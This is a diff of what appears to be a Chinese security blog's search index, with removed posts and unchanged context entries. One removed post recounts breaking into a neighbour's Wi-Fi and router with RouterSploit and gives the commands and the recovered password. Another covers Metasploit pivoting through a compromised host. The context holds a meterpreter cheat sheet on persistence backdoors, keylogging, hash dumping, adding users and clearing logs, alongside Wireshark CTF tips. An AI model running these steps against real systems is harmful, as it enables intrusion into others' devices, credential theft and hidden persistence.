@@ -34,17 +34,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[安装操作系统的那些事儿（Nvme SSD）]]></title>
-    <url>%2F2018%2F07%2F20%2FInstall-operating-system%2F</url>
-    <content type="text"><![CDATA[主要写了一些安装操作系统的说明 安装操作系统的那些事儿（Nvme SSD）前情提要前几天买了一个比较满意的笔记本，8800+RMB。配置如下： 型号：Dell G3 5379 定制版 CPU：i7-8750H RAM：16G DDR4 硬盘：256G Nvme SSD + 1T HD 显卡：GTX 1060MAXQ 6G独显 显示器：15.6英寸 1920*1080 IPS显示屏 笔记本上预装win10家庭版操作系统和正版office 配置方面是很满意的，不满意的就是操作系统是家庭版。除此之外，右击进行刷新时，画面会卡顿一下。挺烦这点的，就想着重装一个win10专业版。以前用的一直都是老版的优启通，这次本来还想继续用这个来装系统的。结果发现PE识别不到固态硬盘！！！ 后来重启N次，也是不行。上网搜索一番之后，发现Nvme的固态硬盘需要win10内核的PE才能识别，而我装的优启通版本过老，最高只到win8内核，所以无法识别到Nvme固态。 找到原因了，那么解决问题就好了。 解决方法 使用UltraISO，将操作系统写入U盘 下载一个内核为win10的PE 直接将操作系统解压到U盘中，双击setup安装 ………… 方法1 使用UltraISO –&gt; 可行具体操作步骤： 1.使用UltraISO打开win10镜像 2.启动–&gt;写入硬盘映像 3.选择要写入的U盘，然后点击’格式化’后，再点击’写入’ 4.写入完成后，重启电脑，进入BIOS，选择从U盘启动，开始windows安装。能够成功识别到Nvme固态 方法2 下载win10内核的PE –&gt; 可行具体操作步骤 去下载优启通最新版/微PE，这两个是我比较喜欢的PE，下面以优启通为例 打开优启通，制作U盘启动盘 制作完成后，将win10镜像放入U盘 重启并选择从U盘启动（不要选择UEFI模式的启动，选择Legacy）启动界面如下，选择Win10PE 这里提一嘴==UEFI==和==Legacy==，这是两种不同的引导方式，win8之后支持快速启动，是新式BIOS即UEFI，同时也支持Legacy；之前是传统BIOS即Legacy。 现在新版电脑都支持UEFI+Legacy双启动模式。UEFI比Legacy开机速度快上不止一倍 原因： 传统Legacy运行流程：新式UEFI运行流程： 两种模式对应的硬盘分区格式 在Legacy启动模式中，硬盘分区格式应该为MBR格式 在UEFI启动模式中，硬盘分区格式应该为GUID(GPT)格式 5.能识别到Nvme固态，安装win10操作系统 方法3 镜像解压到U盘，直接安装 –&gt; 可行这个可行有一个条件，要求必须有一个激活码，输入激活码的步骤不可跳过。]]></content>
-      <categories>
-        <category>安装系统</category>
-      </categories>
-      <tags>
-        <tag>安装系统</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[如何使用wireshark做数据赛]]></title>
     <url>%2F2018%2F07%2F11%2Fwireshark-and-dataGame%2F</url>
     <content type="text"><![CDATA[简单的说一下数据赛 如何使用wireshark做数据赛序章首先来推荐一本书，《Wireshark数据包分析实战（第二版）》，里面详细讲解了网络基础、wireshark的使用分析方法，并以常见的DHCP、TCP、ARP等协议为样例进行分析讲解。这次主要是说一下大致流程，以及一些做题中可能用到的一些小技巧。 显示过滤器显示过滤器完整列表 简单协议说明在做题中，一般都是有http协议，其余常见协议有ssh、telnet、ftp、mysql、snmp、smtp、https、redis等。这其中http、telnet、ftp、redis是明文传输的；smtp是经过base64编码后传输，相当于明文传输；snmp 2.0及以下都是明文传输，3.0以上才是加密传输；mysql登录时密码是密文，其余均是明文；ssh及https是加密传输，https需要有密钥才能得到明文。 渗透套路说明通常情况下，是从内网抓包，抓到黑客通过某个服务（一般是web）拿到某台服务器的shell，经过一系列操作，扫描内网并拿到内网其他机器的权限。 常见问题 黑客执行的第X条命令是啥 黑客拿到XX权限的时间 XXX的账号密码/密码哈希 服务器或黑客的IP/主机名/MAC地址 路由器IP地址/MAC地址 黑客爆破次数 XX文件内容 黑客所使用的工具 CMS名称及版本 shell地址/密码 ……………… 下次出题可以问TCP序号、确认号、客户端连接端口、会话ID，将路由器放在一个不常见IP上，问路由器IP及MAC地址。感觉网络相关的东西还是蛮重要的，顺便略微提升一下难度。 常见坑 由于服务器有内网地址和外网地址之说，所以提交答案时两个都尝试一次 若是询问到登录时间等与时间有关的问题时，要注意时间有两个时间，一个是请求包时间，一个是响应包时间，两个也可以都提交一次 提交答案时左右两侧不要有空格 前面的问题或答案有可能与后面问题有关，要收集整理 看清楚问题，例：端口分为公认端口、注册端口、动态/私有端口，范围不同 做题技巧简单的介绍一些显示过滤器的使用 过滤url中包含ctf的请求 12http.request.uri contains ctfhttp.request.uri matches &quot;ctf&quot; CMS及其版本号 1http contains &quot;Powered by&quot; 寻找菜刀包 1http.request.method==POST 寻找菜刀返回结果 1http contains &quot;-&gt;|&quot; 寻找redis传输内容 1tcp.port eq 6379 寻找反弹shell的传输内容，例：弹回6666端口 1tcp.port eq 6666 mysql进行管理员相关查询 1mysql matches &quot;select.*?user|admin&quot; 其余的小技巧请自行发掘 做题思路首先需要找到题目入口，即找到黑客IP、服务器IP、常见服务等。可以从wireshark的统计中查找大流量，也可以从日志中寻找攻击相关行为。 找到上面信息之后，可以使用如下显示过滤器来只显示黑客相关数据分组 1ip.addr eq 黑客IP 个人认为应以题目答案为导向，但还需要探寻黑客攻击轨迹，进行要点记录，当后面遇到相关题目时，可以从要点中寻找。 前面有说明渗透套路，基本可以按照该顺序寻找黑客攻击线索。]]></content>
@@ -53,28 +42,6 @@
       </categories>
       <tags>
         <tag>wireshark</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[docker的ubuntu 14.04镜像启动mysql失败的解决方法]]></title>
-    <url>%2F2018%2F06%2F22%2Fdocker-mysql-solve%2F</url>
-    <content type="text"><![CDATA[如题 docker的ubuntu 14.04镜像启动mysql失败的解决方法本来是要测试收到的一道题：dogcms，需要用到docker。在进行docker build时，本来一切顺利，当进展到service mysql start时，出现了错误 来看一下原版的dockerfile使用了ubuntu 14.04的系统，先update了一下，然后安装了lamp环境，然后删除了网站首页index.html，复制了几个文件到网站根目录，然后开启mysql服务，导入sql.sql文件，删除sql.sql文件，启动mysql服务和apache服务 没办法，卡在mysql服务启动，容器也无法创建成功，所以稍微修改了一下dockerfile，将mysql相关的全部删除，成功创建容器，新的dockerfile如下图 再次build，然后run一下便会成功创建容器，使用docker attach进入容器内部 成功进入容器内部后，我们需要找到mysql启动失败的原因，然后想办法解决 首先我尝试了一下在容器内部启动Mysql，果不其然又失败了 然后我们来看一下mysql的错误日志，使用命令tail /var/log/mysql/error.log发现了错误信息180621 7:57:58 [ERROR] Fatal error: Can’t open and lock privilege tables: Got error 14 可以看到，前面都进展的很顺利，结果出了一个错误，直接放到google上面搜索一番，最后还真让我找到了解决方法 RUN chown -R mysql:mysql /var/lib/mysql /var/run/mysqld &amp;&amp; \ service mysql start &amp;&amp; \ mvn -q verify site 看起来貌似就是权限的问题，我就试着执行了一下修改权限的命令，然后启动mysql，居然就这样解决了。 最后，修改一下dockerfile 然后再重新build一下，这次可以看到，全部成功了 再来启动容器然后这套题就部署成功啦~]]></content>
-      <categories>
-        <category>docker</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Wpscan不能用的解决办法]]></title>
-    <url>%2F2018%2F03%2F23%2FWpscanResolve%2F</url>
-    <content type="text"><![CDATA[在一个新的kali中使用wpscan会发现无法使用，需要进行一下配置 wpscan不能用的解决方法错误信息：[!] You can not run a scan without any databases. Extract the data.zip file. 错误截图： 解决方法：找到一个可用的data.zip，然后解压到/var/lib/wpscan目录中即可 这里提供一个可用的data.zip]]></content>
-      <categories>
-        <category>问题解决</category>
-      </categories>
-      <tags>
-        <tag>wpscan</tag>
       </tags>
   </entry>
   <entry>
@@ -89,29 +56,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[搬瓦工搭建ShadowSocks]]></title>
-    <url>%2F2017%2F10%2F22%2FConfig-ShadowSocks-Server%2F</url>
-    <content type="text"><![CDATA[有很多同学在百度根本搜索不到想要的东西，而Google这个强大的搜索引擎又被墙了，现在很多vpn都被封了，这个时候只能靠我们自己了 用搬瓦工来vps搭建ShadowSocks实现翻墙上网这里使用shadowsocks来完成本实验的目的，使用shadowsocks的前提条件是需要一台有公网ip的计算机，这里的选择有两种：一种是购买公网服务器，另一种就是购买一台vps。我们这里选择使用vps，因为价钱相对较低。 购买vps：Vps的挑选请根据自己经济条件自行选择，我这里选择的是bandwagon，网址为：http://bandwagonhost.com，这里选择2.99（现在搬瓦工已经被墙了，这里推荐使用官方映像地址：https://bwh1.net，火狐可以进行访问，网速可能会很慢，请耐心等候。注意：不能挂代理访问，否则会出现欺诈账单的现象）美元每月的套餐，此套餐已经能满足日常搜索的需求。如果按年购买会便宜很多，点击上图中的OrderNow按钮进入详情页，在上图中选择按年支付，并选择机房位置，然后选择Add to Cart，这里还要多说一点，，从官方的彩蛋信息中，可以看到还可以使用3-5%的优惠码，可以让最终的成本再便宜一点点。当选择加入商品到购物车之后，会有一个让填入优惠码的地方这个优惠码可以直接在网上搜索，找一个折扣最多的即可：结账的时候需要先注册一个用户，我在这里弄了好久，这里说明一下应该怎么填写注册信息需要特别注意的是：注册的资料尽量真实，才不会被搬瓦工判定为账单欺诈Fraud。注册的IP地址在哪个城市，就应该填写对应的省份、城市，比如：深圳的IP注册，就应该填写广东、深圳市，成功概率高，乱填就麻烦，容易出现账单欺诈。还有一些骚年，那真是马虎大意，挂上美国VPS或者远程桌面到国外VPS上注册，明显IP不是中国国内的呀，还填写中国的地址，不被判账单欺诈Fraud才怪。切记这些小结，就可以注册成功。根据上图所示，我们可以注册个人信息，需要注意几点。A - 所有填写的信息都必须用拼音填写B - 资料是否完全真实无所谓，姓名可以随意，邮箱必须自己的，以免以后找回密码需要C - 国家、地区、省份必须真实，地址你随意填写，电话也可以随意很多人都是因为这里的问题导致无法付款，很多欺诈订单的用户可能会填写其他国家的信息，这是万万不可的，而且不能用V=P=N软件更换IP购买，你就老老实实用真实的IP购买就可以。如果没有问题的话就结账吧(Checkout)：这里支持使用支付宝来支付，后面的步骤就和正常买东西一样了。支付成功后，在最底部选择我的服务： 然后点击控制面板按钮：这个面板里面包含了控制vps的功能，甚至包括了shell功能，如果你不喜欢用页面控制shell也可以使用putty等客户端来连接此vps。购买完成后被预安装的系统为Centos6 ，可以在面板中安装不同的系统，我们这里不做更改。 安装Shadowsocks Server面板安装在KiwiVM的面板中已经存在了安装Shadowsocks Server的功能： 但是此功能只支持Centos系统： 使用面板安装十分方便，只需短短时间就能够直接使用： 命令安装这里讲解使用命令安装Shadowsocks Server（前面用面板装上的可以忽略这里了），使用putty连接到vps上，root密码可以在控制面板中设置。 安装命令如下： 12345yum install epel-releaseyum updateyum install python-setuptools m2crypto supervisoreasy_install pippip install shadowsocks 全部安装完成后，继续执行命令vi1/etc/shadowsocks.json： 然后一次性复制下面的内容（复制之前记得修改443和yourpassword为你自己的端口号和密码，此端口号不是你的SSH端口号，而是你在手机或电脑上的shadowsocks客户端连接VPS上搭建的服务端的端口号，范围 1 - 65535 ，只要不和现有的端口号如SSH端口冲突都可以，记下你修改的端口号和密码）， ———-以下内容为复制内容———- 12345678&#123; &quot;server&quot;:&quot;0.0.0.0&quot;, &quot;server_port&quot;:443, &quot;local_port&quot;:1080, &quot;password&quot;:&quot;yourpassword&quot;, &quot;timeout&quot;:600, &quot;method&quot;:&quot;aes-256-cfb&quot;&#125; ———-以上内容为复制内容———-继续执行命令 1vi /etc/supervisord.conf ———-以下内容为复制内容———- 1234567[program:shadowsocks]command=ssserver -c /etc/shadowsocks.jsonautostart=trueautorestart=trueuser=rootlog_stderr=truelogfile=/var/log/shadowsocks.log ———-以上内容为复制内容———-继续执行命令 1vi /etc/rc.local 在此文件中填写 1service supervisord start 退出后执行reboot来重新启动vps。 配置Shadowsocks客户端Windows用户可以从https://github.com/shadowsocksr/shadowsocksr-csharp/releases下载Shadowsocks客户端，最新版的目录结构为：因为是C#写的，所以需要dotnet库，可以根据自己的实际情况来选择dotnet版本，此软件是绿色软件，直接运行exe即可。并根据自己vps中的设置来填写相关信息：点击确定后，软件会最小化到任务栏窗口，Shadowsocks的默认端口为1080，接下来就可以使用代理软件来连接了。 配置firefox：首先在firefox中安装FoxyProxy Standard这个插件，在其中新建一个代理，内容如下：确定后并在插件中启动此代理就可以了访问一下谷歌： 声明本篇博客只为翻墙搜索学术相关内容而坐，如有人拿来做不法的事情与博主无关。]]></content>
-      <categories>
-        <category>ShadowSocks</category>
-      </categories>
-      <tags>
-        <tag>ShadowSocks</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[一次获取邻居路由器的管理权限]]></title>
-    <url>%2F2017%2F10%2F08%2FRouterSploit%2F</url>
-    <content type="text"><![CDATA[如题 一次获取邻居路由器的管理权限首先要获得密码，连接上对方的wifi，可以用wifi万能钥匙，或者aircrack-ng获取，具体过程不再述说 打开kali，安装routersploit工具： 1git clone https://github.com/reverse-shell/routersploit 安装完成后，进入安装目录下： 1./rsf.py 成功启动会有如下界面： 进行一些配置 123456先加载自动扫描模块：use scanners/autopwn设置目标路由器IP：set target 192.168.168.1进行扫描：exploit 截图中我们可以看到，有两个存在的漏洞 先加载第一个漏洞尝试一下 12345use exploits/routers/zyxel/zywall_usg_extract_hashes设置目标：set target 192.168.168.1检查是否可利用：check 结果是不能利用 再加载第二个利用模块： 12345use exploits/routers/tplink/wdr842nd_wdr842n_configure_disclosure设置目标：set target 192.168.168.1检查是否可利用：check 显示可以利用，我们进行攻击 1exploit OK，成功得到目标路由器的登录密码在浏览器中输入192.168.168.1，输入登录密码：654321成功登陆：]]></content>
-      <categories>
-        <category>无线</category>
-      </categories>
-      <tags>
-        <tag>路由器</tag>
-        <tag>无线</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[Chrome使用进阶]]></title>
     <url>%2F2017%2F10%2F08%2FChromeAdvanced%2F</url>
     <content type="text"><![CDATA[文章里介绍了一些好用插件和快捷键 Chrome使用进阶插件：Set Character Encoding有的版本的Chrome在更多工具和高级里没有修改编码的选项，这个时候就需要安装这个插件了，使用方法：右击页面，选择需要的编码即可 Tampermonkey俗称“油猴”脚本，用来添加实用脚本的插件，点击后可以查看当前页面使用的脚本，可以开启或关闭。管理面板（仪表盘）——》是用来管理所有安装脚本的。添加新脚本——》是直接添加脚本代码，如果你有好的脚本代码可以使用添加新脚本。获取新脚本——》如果你想要使用别人做好的现成的脚本，就需要点击获取新脚本了。其中最好用的是GreasyFork网站，里面的好用脚本挺多的，像：百度云解除大文件下载限制、在线解析VIP视频、跳过验证码等待、解除页面右键限制等等，刚开始访问起来有点慢，请耐心等候。 Proxy SwitchyOmega很好用的代理工具，可以添加代理，并自己设置代理使用条件 HackBar感觉不如火狐上的好用，凑合使用一下还是可以的 有道云笔记网页简报方便快捷的把网页内容或整个网页保存到有道云笔记中 印象笔记.剪藏同上，保存到印象笔记中 修改HTTP头方便的修改或添加HTTP请求头内容 User-Agent Switcher for Chrome修改User-Agent的插件，17-9-10爆出User-Agent Switcher for Google Chrome是木马，所以换了一个插件使用，以防万一咯。里面自带的种类比较少，可以自己从网上下载User-Agent的xml文件，导入进去：右击——》选项——》左侧Import/Export Settings——》右侧选择文件 Word Highlight谷歌搜索关键字高亮插件 Search the current site提供当前浏览网站的站内搜索功能 AdBlock广告屏蔽，屏蔽youtube广告很厉害 Advertising Terminator也是一个屏蔽广告的插件，据说是广告终结者 IP Whois &amp; Flags Chrome &amp; Websites Rating显示当前浏览网站的IP、Whois信息等 删除谷歌重定向避免谷歌搜索结果链接重定向，同时防止点击追踪 LastPassChrome上最好用的密码管理软件，支持密码自动填充、生成密码 Vimium可以让你抛弃鼠标的一个插件（键盘快捷键） Holmes浏览器书签搜索，快捷键：alt+shift+h Allow Copy允许网页的复制 crxMouse Chrome Gestures鼠标手势 Eye Dropper取色器 Show Password on Focus显示密码框内的密码 RescueTime记录你在每个网站上耗用的时间 WebpageScreenshot最好用的网页截图 OneTab节省打开n多标签页时占用的内存 右键搜扩展右键菜单 Chrono下载管理器接管所有下载 Clear Cache点击图标即可清除缓存、cookie等 Code Cola可视化编辑在线页面CSS样式 WEB前端助手(FeHelper)FE助手：字符串编码解码、图片base64编码、代码压缩、梅花、JSON格式化、正则表达式、时间转换工具、二维码生成器、编码规范检测、页面性能检测、栅格检测、JS运行效率分析 二维码(QR码)生成器(QR Code Generator)给当前页面生成二维码 Markdown Here写邮件、印象|为知笔记在线版编辑文字时，遵循markdown语法编辑文字 Listen 1听音乐用的，很好用，在github上：https://github.com/listen1/listen1 The Great Suspnender大家都知道，Chrome 有个通病，就是当你打开多个标签页的时候，比较占用内存资源。浴室这个插件就派上用场了，安装这个插件之后，你设置一定的时间，比如半小时之后，其他标签页如果没有操作，就会被自动回收，节省内存，而当你再切换回之前标签页的时候，会是一片空白，只需要鼠标点击下自动重新加载。 Similar Web可以知道一个网站的流量、来源、排名、竞争等信息 Grammarly可以帮助英语写作，自动检查一些英语单词的拼写和语法，并直接推荐正确的单词或句子 Stylish为任意网站自定义主题 BuiltWith Technology Profiler能够看到网站使用什么技术写的 Note Anywhere让你在任意网页任意位置上贴上小便签 Search by Image(by Google)通过图片搜索图片：可以再网页上任何的图片身上右击以图搜图 Context Menu SearchChrome右键默认只有Google搜索，这个插件可以使用多个搜索引擎：百度、淘宝、必应、360等 Postman一个相当好用的HTTP请求调试工具，能够发送任何类型的HTTP requests，附带任何数量的参数 Regex Search用正则表达式搜索网页内容 快捷键：windows和Linux的 标签页和窗口快捷键：12345678910111213141516开启新窗口：ctrl+n无痕模式打开新窗口：ctrl+shift+n最小化当前窗口：alt+空格+n最大化当前窗口：alt+空格+x退出当前窗口：alt+F4退出Chrome：ctrl+shift+q关闭当前标签页：ctrl+w或ctrl+F4关闭所有打开的标签页和浏览器：ctrl+shift+w开启新标签页：ctrl+t恢复刚关闭的一个标签页：ctrl+shift+t跳转到下一个打开的标签页：ctrl+tab或ctrl+pgdn跳转到上一个打开的标签页：ctrl+shift+tab或ctrl+pgup跳转到指定标签页：ctrl+1~8跳转到最后一个标签页：ctrl+9回退：alt+左箭头前进：alt+右箭头 功能快捷键：1234567891011书签栏的显示/隐藏：ctrl+shift+b打开书签管理器：ctrl+shift+o打开历史记录：ctrl+h打开下载内容：ctrl+j打开开发者工具：ctrl+shift+j或F12打开清除浏览数据：ctrl+shift+delete打开Chrome帮助中心：F1打开Chrome的任务管理器：shift+esc搜索：ctrl+f或F3跳转到搜索的下一条内容：ctrl+g跳转到搜索的上一条内容：ctrl+shift+g 地址栏快捷键：1234567使用默认搜索引擎搜索：输入搜索关键字按enter键使用其他搜索引擎搜索：输入搜索引擎名称并按tab键为网站名称添加www.和.com并打开：输入网站名称并按ctrl+enter打开新的标签页并执行google搜索：输入搜索字词并按alt+enter键跳转到地址栏：ctrl+l、alt+d或F6从页面中的任意位置搜索：ctrl+k或ctrl+e从地址栏中移除联想查询内容：按下箭头以突出显示相应内容，然后按shift+delete 网页快捷键：12345678910111213141516171819202122232425打印当前网页：ctrl+p保存当前网页：ctrl+s重新加载当前网页：F5或ctrl+r重新加载当前网页（忽略缓存的内容）：shift+F5或ctrl+shift+r停止加载网页：esc浏览下一个可点击项：tab浏览上一个可点击项：shift+tab使用chrome打开计算机中的文件：按住ctrl+o并选择文件显示当前网页的HTML源码：ctrl+u将当前网页保存为书签：ctrl+d将所有打开的标签页以书签的形式保存在新文件夹中：ctrl+shift+d全屏：F11放大网页上的所有内容：ctrl++缩小网页上的所有内容：ctrl+-将网页上的所有内容恢复到默认大小：ctrl+0向下滚动网页，一次一个屏幕：空格或pgdn向上滚动网页，一次一个屏幕：shift+空格或pgup在网页上水平滚动：按住shift并滚动鼠标滚轮将光标移动到文本字段中的上一个字词前面：ctrl+左箭头将光标移动到文本字段中的上一个字词后面：ctrl+右箭头删除文本字段中的上一个字词：ctrl+backspace将焦点移动到通知上：alt+n在通知中允许：alt+shift+a在通知中拒绝：alt+shift+d在当前标签页中打开主页：alt+home 鼠标快捷键：12345在新的后台标签页中打开链接：按住ctrl点击链接打开链接，并跳转到该链接：按住ctrl+shift点击链接在新窗口中打开链接：按住shift点击链接下载链接目标：按住alt点击链接显示浏览记录：右击后退或前进]]></content>
@@ -120,41 +64,6 @@
       </categories>
       <tags>
         <tag>浏览器</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[爬取Nmap中文官方文档]]></title>
-    <url>%2F2017%2F09%2F28%2FCrawlerNmapDoc%2F</url>
-    <content type="text"><![CDATA[如题 爬取Nmap中文官方文档因为将要面试了，想要熟悉一下Nmap，感觉看官方文档最权威，又比较喜欢在本地查看，所以就写了一个爬虫，下载到本地保存成html，没什么技术含量，感兴趣的可以看一下。 中间也是遇到了一些坑。 在浏览器中不挂代理是可以访问的，所以一开始连接不上网页，我还以为是代码写的有问题或做了一些反爬虫机制，一行一行的去调试。后来发现是墙外的，必须挂代理才能访问。又添加了一个使用ShadowSocks代理的功能，然后就可以正常爬取了。 后来保存文件时，我想保存成中文的文件名，结果成了乱码，尝试’wb’写入对文件名无效，最后是尝试着是filename.decode(‘utf-8’)可以成功写成中文文件名。我也不知道是为什么。编码这里还是很薄弱的，以后再好好弥补。 本来以为这样就没什么问题了，后来程序运行到一半就报错了，文件也只保存了一部分，还是打开文件的位置报错，然后就一步一步的调试，发现有一个文件名是“防火墙/IDS躲避和哄骗”，因为文件名不能包含’/‘这个字符，所以报错。又补充了一下将文件名中的’/‘替换成’、’，这样程序才正常运行下来。 脚本链接]]></content>
-      <categories>
-        <category>爬虫</category>
-      </categories>
-      <tags>
-        <tag>爬虫</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[爬虫脚本]]></title>
-    <url>%2F2017%2F09%2F24%2FsimpleReptile%2F</url>
-    <content type="text"><![CDATA[老师领着我们敲了一遍爬虫，可以爬取安全维基上的技术文章。原脚本使用了urllib2,bs4,re库，单线程，可以获取标题、链接、时间 脚本链接 留给我们的作业是获取作者和文章分类，实现多线程。此外我自己改用了requests库 脚本链接]]></content>
-      <categories>
-        <category>爬虫</category>
-      </categories>
-      <tags>
-        <tag>爬虫</tag>
-        <tag>py脚本</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[ftp爆破py脚本]]></title>
-    <url>%2F2017%2F09%2F24%2FftpBlastPYScript%2F</url>
-    <content type="text"><![CDATA[一个py脚本，用来爆破ftp服务器的。第一次自己写脚本，很多地方不规整，记录一下自己的第一步。下载地址]]></content>
-      <categories>
-        <category>py脚本</category>
-      </categories>
-      <tags>
-        <tag>ftp爆破</tag>
-        <tag>py脚本</tag>
       </tags>
   </entry>
   <entry>
@@ -205,19 +114,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[run vnc遇到的问题解决]]></title>
-    <url>%2F2017%2F09%2F16%2FsolveRunVnc%2F</url>
-    <content type="text"><![CDATA[解决run vnc无法进行控制的问题，以及-c参数无法打开 run vnc无法控制屏幕解决：打开/usr/share/metasploit-framework/scripts/meterpreter/vnc.rb添加：然后问题就解决了 -c参数无法打开courtesy shell：]]></content>
-      <categories>
-        <category>问题解决</category>
-      </categories>
-      <tags>
-        <tag>meterpreter</tag>
-        <tag>run vnc</tag>
-        <tag>问题解决</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[meterpreter常用命令+脚本]]></title>
     <url>%2F2017%2F09%2F16%2FmeterpreterCommand%2F</url>
     <content type="text"><![CDATA[如题 meterpreter常用命令+脚本常用命令1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041、background返回，把meterpreter后台挂起2、sessions-u 将shell会话提升为meterpreter会话-v 以详细模式列出会话-x 增加扩展信息展示-l 查看已经成功获取的会话-i 与指定的会话进行交互，即切换到指定id的会话-k 杀掉指定id的会话-K 杀掉所有会话-C 执行一个meterpreter的命令-c 执行一个meterpreter的命令，需指定id-s 执行一个脚本，指定id3、shell获取目标主机的远程命令行shell，使用exit退出回到meterpreter4、cat查看目标主机上的文档内容cat c:\\boot.ini 或c:/boot.ini 查看主机启动引导信息 5、getwd与getlwd获取肉鸡的当前目录 和 获取本机的当前目录6、upload上传文件到肉鸡upload nc.exe c:/windows/system32/7、download下载文件到本地download c:\\boot.ini /root/8、edit调用vi编辑器，对目标主机上的文件进行修改edit c:\\windows\\system32\\drivers\\etc\\hosts9、search在肉鸡上搜索文件search -d c:/ -f *.doc10、ipconfig查看ip地址11、portfwd端口转发portfwd add -l 1234 -p 3389 -r 192.168.86.136，远程登录 0.0.0.0:1234 即可12、route显示肉鸡上的路由表13、getuid查看当前用户14、sysinfo查看系统信息15、ps查看肉鸡上运行的进程16、migrate将meterpreter会话移至到另一个进程17、execute让肉鸡运行某个程序-f 使用时需要加上-H 后台执行-a 传递给命令的参数-c 交互命令时使用-i 进程创建之后进行交互-m 从内存执行例：execute -H -m -d notepad.exe -f wce.exe -a &quot;-o wce.txt&quot;-d 在肉鸡执行时显示的进程名称（用来伪装），-m直接从内存中执行，&quot;-o wce.txt&quot;是wce.exe的运行参数18、getpid获取meterpreter的进程id19、shutdown关机20、post/windows/gather/forensics/enum_drives可获取目标主机存储器信息run post/windows/gather/forensics/enum_drives21、checkvm确定主机是否是一台虚拟机run checkvm22、persistence植入后门程序run persistence -X -i 5 -p 4444 -r 192.168.20.186-X 在肉鸡上开机自启动-i 不断尝试反向连接的时间间隔-r lhost-p lport23、metsvc将payload安装为服务（meterpreter），会建立一个端口成为服务器run metsvc24、getgui开启目标主机远程桌面，添加账号run getgui -e 开启远程桌面run getgui -u hacker -p hacker 添加用户25、getsystem提升权限到system26、keyscn键盘记录器keyscan_start 开始键盘记录keyscan_stop 停止键盘记录keyscan_dump 下载键盘记录27、hashdump获取账号密码28、post/windows/gather/enum_applications获取肉鸡上的软件安装信息run post/windows/gather/enum_applications29、post/windows/gather/dumplinks获取肉鸡最近访问过的文档、链接信息run dumplinks30、post/windows/gather/enum_ie读取目标主机IE浏览器cookies等缓存信息run post/windows/gather/enum_ie31、get_local_subnets查看已拿下的目标主机的内网IP段情况run get_local_subnets32、clearev痕迹擦除 好用脚本路径：（/usr/share/metasploit-framework/scripts/meterpreter）： 123456789101112131415161718192021checkvm 检查是否是虚拟机vnc 上传一个vnc服务到对方机器，然后在本地打开vnc服务并连接autoroute 可以添加，删除，显示路由表get_application_list 获取安装的程序列表enum_firefox 获取firefox中的信息arp_scanner 存活主机扫描（常用在内网） run arp_scanner -r 192.168.86.0/24get_env 获取环境变量credcollect 获取主机上的hash等凭证getgui 可以开启远程桌面服务，添加用户，端口转发 run getgui -f 12345 -e（3389转发到12345） run getgui -u hacker -p hacker （添加用户）dumplinks 文件操作记录（时间戳、文件位置、共享名、序列号等）duplicate 再次产生payload，注入到其他进程或打开新进程注入credcollect 收集主机的hash凭证metsvc 将payload安装为服务（meterpreter），会建立一个端口成为服务器persistence 建立一个持久性的后门hostsedit 操作hosts文件keylogrecorder 内置此功能winenum 自动运行多种命令，将命令结果保存到本地hashdump 与meterpreter的hashdump一样win32-sshserver 安装openssh服务（Linux）enum_logged_on_users 列出当前登陆的用户getvncpw 获取vnc密码]]></content>
@@ -226,19 +122,6 @@
       </categories>
       <tags>
         <tag>meterpreter</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[msf中代理使用方法]]></title>
-    <url>%2F2017%2F09%2F15%2FmsfProxy%2F</url>
-    <content type="text"><![CDATA[有的时候我们可能得到一台肉鸡的权限（meterpreter会话），想用这台肉鸡作为跳板去攻击肉鸡内网或互联网上的其他机器，就需要我们使用肉鸡作为代理啦。 msf中代理使用方法前提：已与肉鸡建立meterpreter会话 环境：攻击机kali：192.168.20.186 肉鸡xp：192.168.86.136内网其他机器server2003：192.168.86.138 实验思路： 要使用肉鸡作为代理，首先我们要先与对方建立会话，得到相应权限 然后本地建立一个路由表，让我们可以通过session 1找到肉鸡（因为有可能对方是在内网中，我们无法直接通过IP地址找到）。 通过sock4a模块，让肉鸡开启sock4a服务。 在本地配置proxychains，配置自己的sock4a客户端，让我们可以连接到sock4a服务端。连接后，proxychains的流量都会走肉鸡，为自己增加了一层代理保护。 步骤：1、1sessions -l 查看会话列表 2、12route add 192.168.86.136 255.255.255.0 1 添加路由表命令说明： route add 肉鸡ip 子网掩码 sessionId 1route 查看路由表，可以看到刚刚添加进去的路由信息 3、1234use auxiliary/server/socks4a 使用socks4a模块set srvhost 127.0.0.1 set srvport 1080exploit -y 4、12vi /etc/proxychains.conf 打开一个新终端，配置proxychains在最后添加一条 socks4 127.0.0.1 1080 ，保存退出 5、1proxychains rdesktop 192.168.86.138 远程登录内网server2003机器 代理成功]]></content>
-      <categories>
-        <category>metasploit</category>
-        <category>代理</category>
-      </categories>
-      <tags>
-        <tag>metasploit</tag>
-        <tag>代理</tag>
       </tags>
   </entry>
   <entry>
@@ -265,18 +148,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[脚本代理工具使用总结]]></title>
-    <url>%2F2017%2F09%2F13%2FscriptProxy%2F</url>
